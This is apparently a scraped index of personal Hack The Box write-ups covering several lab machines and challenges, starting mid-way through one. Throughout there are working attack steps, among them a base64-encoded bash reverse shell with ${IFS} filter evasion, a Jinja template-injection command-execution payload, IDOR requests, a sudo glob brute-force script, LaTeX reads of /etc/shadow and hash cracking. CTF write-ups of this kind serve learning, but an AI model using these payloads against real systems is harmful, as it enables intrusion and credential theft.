inquireUser: &quot;/api/v2/auth/inquire&quot;, }, Potentially the last endpoint allows us to enumerate the users. If we pay attention to the visible deposit, we can see it's coming from neo_system. If we call the inquie endpoint, we can see its id: {&quot;_id&quot;:&quot;688cf823d181feda936b9d54&quot;,&quot;username&quot;:&quot;neo_system&quot;} In the PDF download button, if we change from v2 to v1, we get the following message: {&quot;message&quot;:&quot;_id is not provided&quot;} which ressembles to MongoDB database error: https://stackoverflow.com/questions/24427845/can-not-find-a-record-by-its-id-in-mongodb curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \\ -H 'Accept: */*' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ -H 'Content-Type: application/json' \\ -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \\ -H 'Origin: http://94.237.61.242:59723' \\ -H 'Proxy-Connection: keep-alive' \\ -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \\ --data-raw '{&quot;_id&quot;:&quot;688cf823d181feda936b9d54&quot;,&quot;username&quot;:&quot;neo_system&quot;}' \\ --insecure And it works, we can see it made a deposit to a user named user_with_flag. Let's enquire the user: {&quot;_id&quot;:&quot;688cf823d181feda936b9d59&quot;,&quot;username&quot;:&quot;user_with_flag&quot;} and retrieve the transactions again for this user: curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \\ -H 'Accept: */*' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ -H 'Content-Type: application/json' \\ -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \\ -H 'Origin: http://94.237.61.242:59723' \\ -H 'Proxy-Connection: keep-alive' \\ -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \\ --data-raw '{&quot;_id&quot;:&quot;688cf823d181feda936b9d59&quot;,&quot;username&quot;:&quot;user_with_flag&quot;}' \\ --insecure And we can see the secret into the PDF","keywords":"","version":"Next"},{"title":"Analytics","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/analytics","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Analytics","url":"/docs/write-up/htb/machines/easy/analytics#enumeration","content":" nmap 10.10.11.233 -A -oA machines/analytics/enumeration/scans/all-ports -p- --min-rate 1000   Shows ports 22 and 80.  SSH version looks quite recent, let's focus on port 80:  http://analytical.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]   Checking the website, I see a Login section that redirects to another subdomain: data.analytical.htb. Let's add it to the /etc/hosts. It shows the login page of Metabase, let's try some default credentials.  The metabase version looks like it's v0.46.6.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Analytics","url":"/docs/write-up/htb/machines/easy/analytics#foothold","content":" Found a POC for this precise version: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/  With the payload in the description and modifying it with our local IP,port we got foothold!  e4396eead2c0:/$ id id uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)   However, we cannot see any relevant users:  e4396eead2c0:~$ cat /etc/passwd|grep &quot;home&quot; cat /etc/passwd|grep &quot;home&quot; metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash   In that /home/metabase folder there's nothing and we see it's using /bin/ash, there's a high chance this is running inside a docker container. We'll need to investigate how to bypass it.  Right now we have access to the docker container, but we cannot exit it.  We can exfil the database which looks like a H2 instance.  We can check the environment variables:  5d711b9d670a:/metabase.db$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=5d711b9d670a LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/metabase.db LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_dsXXXX# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env OLDPWD=/   We tried to use the user/password in env var and boom, we got user access.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Analytics","url":"/docs/write-up/htb/machines/easy/analytics#privilege-escalation","content":" Search OS version and kernel for CVEs:  uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux   If we look in Google for 6.2.0-25-generic #25~22.04.2-Ubuntu CVE you'll see this link: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability and this link https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629  Now it's just a matter of cloning the repo and run the exploit and you get root access directly and pwned! ","version":"Next","tagName":"h2"},{"title":"Cap","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/cap","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Cap","url":"/docs/write-up/htb/machines/easy/cap#enumeration","content":" Let's do network enumeration with nmap:  └─$ nmap 10.10.10.245 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 22:56 CEST Nmap scan report for 10.10.10.245 Host is up (0.034s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds   FTP does not allow anonymous access  Whatweb reveals gunicorn server:  whatweb 10.10.10.245 http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Cap","url":"/docs/write-up/htb/machines/easy/cap#foothold","content":" Looks like in the download area, we can pass a parameter and it will us access to captures that are not ours:  http://10.10.10.245/data/0  and we can see the ftp password for nathan. Unfortunately for him, he reused the same password for SSH and we can get the flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Cap","url":"/docs/write-up/htb/machines/easy/cap#privilege-escalation","content":" Use linPEAS to search for possible privesc vectors  The output of linPEAS show:  Files with capabilities (limited to 50): /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip   python 3.8 has setuid capability, which will allow the process to set the userid. We can abuse this to set uid to 0 (root) and get a root shell and retrieve the root flag. ","version":"Next","tagName":"h2"},{"title":"Spookypass","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/spookypass","content":"Spookypass https://app.hackthebox.com/challenges/SpookyPass All the coolest ghosts in town are going to a Haunted Houseparty - can you prove you deserve to get in? This is a reversing challenge, we need to provide a password to get in. Let's use ghidra to see the code and try to find the password. Running the command: └─$ ./pass Welcome to the SPOOKIEST party of the year. Before we let you in, you'll need to give us the password: Welcome inside! HTB{uXXXXXXXX} It was extremely easy, just use ghydra and search for the text &quot;give us the password&quot;. This is the decompiled code: puts(&quot;Welcome to the \\x1b[1;3mSPOOKIEST\\x1b[0m party of the year.&quot;); printf(&quot;Before we let you in, you\\'ll need to give us the password: &quot;); fgets(local_98,0x80,stdin); pcVar2 = strchr(local_98,10); if (pcVar2 != (char *)0x0) { *pcVar2 = '\\0'; } iVar1 = strcmp(local_98,&quot;s3cr3t_p455_f0r_gh05t5_4nd_gh0ul5&quot;); Which shows the password to provide. Once provided, the program will print the flag to provide. Piece of cake!","keywords":"","version":"Next"},{"title":"Codify","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/codify","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Codify","url":"/docs/write-up/htb/machines/easy/codify#enumeration","content":" curl 10.10.11.239 &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt; &lt;html&gt;&lt;head&gt; &lt;title&gt;301 Moved Permanently&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;h1&gt;Moved Permanently&lt;/h1&gt; &lt;p&gt;The document has moved &lt;a href=&quot;http://codify.htb/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;hr&gt; &lt;address&gt;Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80&lt;/address&gt; &lt;/body&gt;&lt;/html&gt;   Let's add the host to /etc/hosts  nmap reports several things opened:  PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework |_http-title: Codify   The port 80 is a webserver that hosts a NodeJS editor to execute NodeJS in a sandboxed scenario.  Port 3000 looks the same.  The sandbox looks like it's using the vm2 library:   The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.   The sandbox has the following limitations: http://codify.htb/limitations  The editor works by sending a POST request with base64 content:  curl 'http://codify.htb/run' -X POST -H 'Referer: http://codify.htb/editor' -H 'Content-Type: application/json' -H 'Origin: http://codify.htb' --data-raw '{&quot;code&quot;:&quot;YQ==&quot;}'   This request belongs to the code a:  └─$ echo YQ== | base64 -d a   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Codify","url":"/docs/write-up/htb/machines/easy/codify#foothold","content":" Look at Google for vm2 escape, found this payload: https://security.snyk.io/vuln/SNYK-JS-VM2-5537100  Prepared the script a bit and got it, then send a reverse shell and we're in as svc user and then improve to a good shell.  Found the user joshua on /etc/passwd.  Checking the contents of the server, there's the contact folder which looks like an old nodejs app. It has a sqlite database which contains a users table with an entry for joshua. Let's try to crack the bcrypt hash stored there.  hashcat exfil/hash -m 3200 -a 0 /usr/share/wordlists/rockyou.txt   Found the password for user joshua, now connect with SSH, and we're in and get can get the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Codify","url":"/docs/write-up/htb/machines/easy/codify#privilege-escalation","content":" The user joshua can execute this command as root:  joshua@codify:~$ sudo -l [sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh   In that script, there's one if statement that checks the user input password with the credentials stored in one file:  if [[ $DB_PASS == $USER_PASS ]]; then   The problem with that is, this if does not perform string comparison, it performs pattern matching. Which means that it USER_PASS is *, the if will pass.  The pattern matching will work with any character, for instance let's say the password is password, if the user provides the password p* it will pass, so we can slowly bruce-force each character thanks to pattern matching with the following script:  import string import subprocess import time all_characters = list(string.ascii_letters + string.digits) password = &quot;&quot; while True: for char in all_characters: command = f&quot;echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh&quot; output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout if &quot;Password confirmed&quot; in output: password += char print(password) time.sleep(1)   And found the password for root, now we can run su and provide that password and we got root access. ","version":"Next","tagName":"h2"},{"title":"CozyHosting","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/cozy-hosting","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#enumeration","content":" Initial scans shows exposed ports 22 and 80  Looks like it's trying to redirect to http://cozyhosting.htb. Let's add it to the /etc/hosts  curl -I cozyhosting.htb HTTP/1.1 200 Server: nginx/1.18.0 (Ubuntu) Date: Thu, 21 Sep 2023 19:13:45 GMT Content-Type: text/html;charset=UTF-8 Connection: keep-alive X-Content-Type-Options: nosniff X-XSS-Protection: 0 Cache-Control: no-cache, no-store, max-age=0, must-revalidate Pragma: no-cache Expires: 0 X-Frame-Options: DENY Content-Language: en-US   Let's try to explore the directories with gobuster and it could not find anything.  Checking the headers, looks like the Content-Type is application/json, so probably there's an API behind  Checking the error pages seems the one generated by Spring Framework. We can probe that by checking if it has the /actuator endpoint public.  Probably the nginx server is acting as a proxy since the actuator returns localhost:8080 as the API address  /actuator/sessions returns interesting data:  {&quot;71555732BBE84C711A910118954B72C3&quot;:&quot;kanderson&quot;,&quot;24BF9E9AC99A7F02F4006F36634DB3F1&quot;:&quot;UNAUTHORIZED&quot;,&quot;3C47D6E35D00F4B01B7EF0EE5F3305FA&quot;:&quot;UNAUTHORIZED&quot;,&quot;217ABE7CFC46C07AF69818945F9B702E&quot;:&quot;kanderson&quot;}   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#foothold","content":" If we check the page, looks like there's a login page, if we change the JSESSIONID cookie by the value in the /actuator/sessions for user kanderson, we'll be redirected to the /admin page.  Once we enter the admin page we see a form that if we send it will call the /executessh endpoint ...  From the error, we could think that is calling the ssh command directly, so maybe this is vulnerable to command injection. We can try to get the output of id command.  Looks like hostname is validated somehow, however with username we can break the command execution:  curl -vvvvv 'http://cozyhosting.htb/executessh' -X POST \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Cookie: JSESSIONID=B762D32C36AE8003E582400AC70E4261' \\ --data-raw 'host=localhost&amp;username=`id`'   It's pretty hard to know how to make the command execution works, you need to try several combinations with \\`` and ;` and eventually got it working. Now let's open a reverse shell. In order to get the reverse shell, take into account that username cannot have spaces, a minimal validation is done.  To generate the payload that generates the reverse shell:  Search a payload here: https://www.revshells.com/  /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.183/4444 0&gt;&amp;1   Let's base64 it:  echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.183/4444 0&gt;&amp;1&quot; | base64 -w 0 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg==   Make the payload: echo the base64 payload, then base64 decode the payload and let bash run the payload:  echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg== | base64 -d | bash   You can run that payload and it should create a new connection to the listening nc  The endpoint don't link spaces, so let's replace it for the IFS character:  echo${IFS}&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg==&quot;${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash  However, if we try that payload, it will complain about whitespaces...  Do URL-encode and it will work  Now we have foot-hold in the machine but without a relevant user  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#lateral-movement","content":" if we do ls we can see a jarfile, let's download it. Searching inside the jar file, we see a promising thing, the configuration for the postgres database:  spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting spring.datasource.username=postgres spring.datasource.password=Vg&amp;nvzAQ7XxR   psql --user postgres --host localhost --port 5432 --password   We can find the users database:   name | password | role -----------+--------------------------------------------------------------+----- -- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi n   The password for kanderson can be seen in the code and is MRdEQuv6~6P9  Nothing seems to indicate the password for user josh. Let's try to crack the password for admin with john the ripper:  john exfil/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   With that password, we can now enter the ssh with user josh and we are in and we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#privilege-escalation","content":" sudo -l shows that the user josh can run ssh with root privileges, let's check in GTFO bins how to use it to get root access. ","version":"Next","tagName":"h2"},{"title":"Keeper","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/keeper","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Keeper","url":"/docs/write-up/htb/machines/easy/keeper#enumeration","content":" Initial scan shows only port 22 and 80, let's deep dive.  SSH: OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0  Web: nginx 1.18.0 (Ubuntu)  whatweb does not show anyhing interesting...  If we get into the page, we see a link saying:  To raise an IT support ticket, please visit tickets.keeper.htb/rt/   which might indicate a domain-sub somewhere. Before we explore that topic, let's run gobuster to see if it sees something (no luck), only index.html is there.  If we try to access, the domain is not reachable, let's try to add it to the /etc/hosts and BINGO!  Now whatweb show interesting results:  └──╼ $whatweb http://tickets.keeper.htb/ http://tickets.keeper.htb/ [200 OK] Cookies[RT_SID_tickets.keeper.htb.80], Country[RESERVED][ZZ], Email[sales@bestpractical.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[RT_SID_tickets.keeper.htb.80], IP[10.10.11.227], PasswordField[pass], Request-Tracker[4.4.4+dfsg-2ubuntu1], Script[text/javascript], Title[Login], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]   Looks like the server is running an instance of Best Practical Request Tracker (RT) version 4.4.4  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Keeper","url":"/docs/write-up/htb/machines/easy/keeper#foothold","content":" After some searching I found this page: https://www.192-168-1-1-ip.co/router/bestpractical/rt/12338/, there mentions default credentials: root/password and boom! we are logged as Admin user in the Request Tracker.  Checking the users section, we can find a user and in the comments, we can see the password. If we try to SSH with that credentials, it just works :) and we got the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Keeper","url":"/docs/write-up/htb/machines/easy/keeper#privilege-escalation","content":" In the home folder of the user there are some files that looks like a KeePass dump and database. Most likely, we need to extract the master password from it and import into a local instance of keepass.  Looks like keepass had a vulnerability and the master password can be extracted from a dump, see https://github.com/CMEPW/keepass-dump-masterkey  If we run that script it will generate a list of candidates that will lack the first character. We might need to think a bit on how to recover all the pass phrase. Maybe a google search with the guessed characters will help ...  Once we have the keepass passwword, we can browse the keys stored using kpcli. There we find the entries for root and for the user. We find the root entry as a putty key file, which we need to convert to openssh key using puttygen ","version":"Next","tagName":"h2"},{"title":"Jinjacare","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/jinjacare","content":"","keywords":"","version":"Next"},{"title":"Recon​","type":1,"pageTitle":"Jinjacare","url":"/docs/write-up/htb/challenges/jinjacare#recon","content":" └─$ whatweb http://94.237.54.192:47055/http://94.237.54.192:47055/ [200 OK] Country[FINLAND][FI], Email[info@jinjacare.com], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], Script, Title[JinjaCare - Home], nginx[1.22.1]  The source code is not bundled, so we can take a look.  Non-logged user interactions:  LoginRegisterVerify certificate  Logged interactions:  Download certificateUpdate personal infoAdd record to medical historyAdd vaccination record  The downloaded certificate has a QR worth exploring... it has the URL to verify the certificate. When verifying the certificate, we get:  Certificate is valid Name: Test test Issue Date: 2025-08-02 Status: Valid Certificate ID: 4b7c8a77-1d21-43b8-9f95-cdd81ca988fc   So, it's a way of exposing data, we would need to have the certificate ID.  Regarding the session cookie:  The value is a signed, URL-safe, possibly zlib-compressed Base64-encoded token.  Likely generated using Python’s itsdangerous or Django/Flask session management.  You need the secret key to decode it completely and safely.  from itsdangerous import URLSafeTimedSerializer # Substitute with your actual secret key secret_key = 'secret' serializer = URLSafeTimedSerializer(secret_key) decoded = serializer.loads('eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4') print(decoded)   With burp suite, we see the session cookie changes from  Cookie: session=.eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4   to  Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.aI3UXA.CYoLW8CfalTCefLOSG2huGM7ptg   With base64 decode, we got:  {&quot;_fresh&quot;: false}   Maybe we can copy the contents of this cookie, to get acess to the dashboard.  Most likely, we'll need to get a way to retrieve a UUID and then call the verify  Doing directory bruteforce, we can find an interesting directory: console. Looks like it's a Console // Werkzeug Debugger  which asks for a PIN. We can compute this PIN, but will need access to the machine itself.  The output is reflected in the generated PDF, we might be able to inject some malicious payload in the Full Name field.  ","version":"Next","tagName":"h2"},{"title":"SSTI​","type":1,"pageTitle":"Jinjacare","url":"/docs/write-up/htb/challenges/jinjacare#ssti","content":" From the downloaded PDF, we can see that is generate with whhtmltopdf. Looks like we can break PDF Generation using { char. When the full name is set to {{{{{ the PDF generation breaks with :  Error generating certificate: unexpected '&lt;'   or with another payload:  &lt;iframe src=”file:///etc/passwd” height=”500” width=”500”&gt;   the error is:  Error generating certificate: wkhtmltopdf reported an error: The switch --no-outline, is not support using unpatched qt, and will be ignored.QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root' Exit with code 1 due to network error: ContentNotFoundError   which looks like the output of the command, so we have command injection vulnerability here.  However, judging by the name of the challenge, we might be lucky to have simple Jinja template injection on the Full Name field  Call to update the profile  curl 'http://94.237.50.221:34050/profile/personal' \\ -X POST \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \\ -H 'Accept-Language: en-US,en;q=0.5' \\ -H 'Accept-Encoding: gzip, deflate' \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Origin: http://94.237.50.221:34050' \\ -H 'Connection: keep-alive' \\ -H 'Referer: http://94.237.50.221:34050/profile/personal' \\ -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \\ -H 'Upgrade-Insecure-Requests: 1' \\ -H 'Priority: u=0, i' \\ --data-raw 'name={{2*2}}&amp;email=test%40test.htb&amp;phone=None&amp;address=None&amp;dateOfBirth=2025-08-05&amp;gender=male&amp;emergencyName=None&amp;emergencyPhone=None&amp;relationship=None'   In the PDF we can see the number 4 reflected, so looks like we have simple template injection working. No need to try to break whtmltopdf to explot the command injection.  According to https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection, the next thing is identify the templating engine, if you look at the tittle of change, there are high chances we're dealing with Jinja templating engine.  We can use SSTI to read the files in the server, and we see there's a flag.txt  curl 'http://94.237.50.221:34050/profile/personal' \\ -X POST \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \\ -H 'Accept-Language: en-US,en;q=0.5' \\ -H 'Accept-Encoding: gzip, deflate' \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Origin: http://94.237.50.221:34050' \\ -H 'Connection: keep-alive' \\ -H 'Referer: http://94.237.50.221:34050/profile/personal' \\ -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \\ -H 'Upgrade-Insecure-Requests: 1' \\ -H 'Priority: u=0, i' \\ --data-raw 'name={{config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;ls /&quot;).read()}}&amp;email=test%40test.htb&amp;phone=None&amp;address=None&amp;dateOfBirth=2025-08-05&amp;gender=male&amp;emergencyName=None&amp;emergencyPhone=None&amp;relationship=None'   And we got the flag! ","version":"Next","tagName":"h2"},{"title":"Brutus","type":0,"sectionRef":"#","url":"/docs/write-up/htb/sherlocks/brutus","content":"Brutus In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution. Make sure to use 7zip to extract the file, it does not work with unzip. The sherlock is very easy to complete, just read the auth.log and use the provider parser to extract the required timestamps. Remember, they will be in your system time, you need to convert them to UTC.","keywords":"","version":"Next"},{"title":"Topology","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/topology","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/machines/easy/topology#enumeration","content":" Port 80 and 22 open  22  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   80  PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Miskatonic University | Topology Group   Browsing the website, found this subdomain: http://latex.topology.htb/equation.php, it contains a form where you input Latex commands and a mechanism behind that generates a png.  Let's search for more subdomains with gobuster:  ./gobuster vhost -u 10.10.11.217 -k --domain &quot;topology.htb&quot; --append-domain -w ~/workspace/gal/SecLists/Discovery/DNS/subdomains-top1million-5000.txt   Found subdomains:  dev.topology.htbstats.topology.htb  Most likely, the service works by writing the provided equation to a file, then invoke a command to pass from tex to png  In a log file we can see the following:  This is pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) (preloaded format=pdflatex 2022.2.15) 12 MAR 2022 08:48   We see that we can inject commands in Latex, however there are some prohibitions in place:  Prohibited commands:  \\input\\include\\verbatiminput\\write\\outfile{Hello-world}\\immediate\\write18{id &gt; output}  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/machines/easy/topology#foothold","content":" This payload works but only returns the first line:  \\newread\\file \\openin\\file=/etc/passwd \\read\\file to\\line \\text{\\line} \\closein\\file   There's another option to read files:  $\\lstinputlisting{/etc/passwd}$   Here we can see the user vdaisley.  Knowing that we have scanned the vhost and found dev and see some .htaccess and .htpasswd, now we can download them with the previous discovered reading method.  $\\lstinputlisting{&quot;/var/www/dev/.htpasswd&quot;}$ $\\lstinputlisting{&quot;/etc/shadow&quot;}$   it will download the PNG image with the file contents, the password stored is a MD5 hash, which we can extract using tesseract:  tesseract exfil/equation.png exfil/equation.txt   Then crack the hash using hashcat:  hashcat hash.txt ~/workspace/SecLists/Passwords/Leaked-Databases/rockyou.txt   This will return the password for user vdaisley, now you can SSH into the machine and get permanent access.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/machines/easy/topology#privilege-escalation","content":" In /opt we can find the gnuplot binary owned by root but with write and execution permissions for the user.  This binary is used to generate the images. We can try to see if it's execute by running ps aux multiple times.  If we don't see any result, it means the process is executed by another user. But don't worry, we can use pspy to monitor processes not 